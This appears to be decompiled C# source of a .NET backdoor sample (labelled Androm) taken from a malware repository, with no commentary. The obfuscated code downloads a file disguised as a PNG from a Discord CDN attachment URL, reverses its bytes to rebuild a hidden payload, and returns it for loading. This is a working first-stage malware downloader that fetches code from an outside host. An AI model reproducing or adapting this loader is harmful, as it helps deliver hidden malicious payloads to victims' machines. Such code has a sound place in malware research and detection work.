// Decompiled with JetBrains decompiler
// Type: .
// Assembly: Rldwjsj, Version=3.5.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 13C832CC-2670-41ED-9967-3E16CBCF38A1
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Backdoor.Win32.Androm.gen-7e1cab85784e5b30bbf07932f858012429e784da3c5b81eaea94209af77fa893.exe

using \u0001;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net;

namespace \u0001
{
  internal class \u0001
  {
    [STAThread]
    private static int \u0001()
    {
label_0:
      \u0004.\u0001();
      \u0004.\u0001();
      if (false)
        goto label_2;
      else
        goto label_6;
label_1:
label_2:
      if (true)
      {
        int num1 = 0;
        int num2;
        while (true)
        {
          int num3 = num1;
          if (true)
          {
            num2 = num3;
            if (false)
              num1 = num2;
            else
              break;
          }
          else
            goto label_1;
        }
        return num2;
      }
      goto label_0;
label_6:
      \u0004.\u0001();
      goto label_1;
    }

    internal static List<byte> MemoryStream
    {
      get
      {
        if (true)
          goto label_10;
label_7:
label_8:
        List<byte> byteList;
        return byteList;
label_10:
        byteList = new List<byte>();
        try
        {
          ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
        }
        catch
        {
        }
        byte[] collection = new BinaryReader(WebRequest.Create("https://cdn.discordapp.com/attachments/946667303825735721/947081148180361266/Rldwjsj.png").GetResponse().GetResponseStream()).ReadBytes(80545763);
        if (true)
        {
          if (collection.Length == 0)
            return (List<byte>) null;
          byteList.AddRange((IEnumerable<byte>) collection);
          if (false)
            ;
          byteList.Reverse();
          goto label_7;
        }
        else
          goto label_8;
      }
    }
  }
}
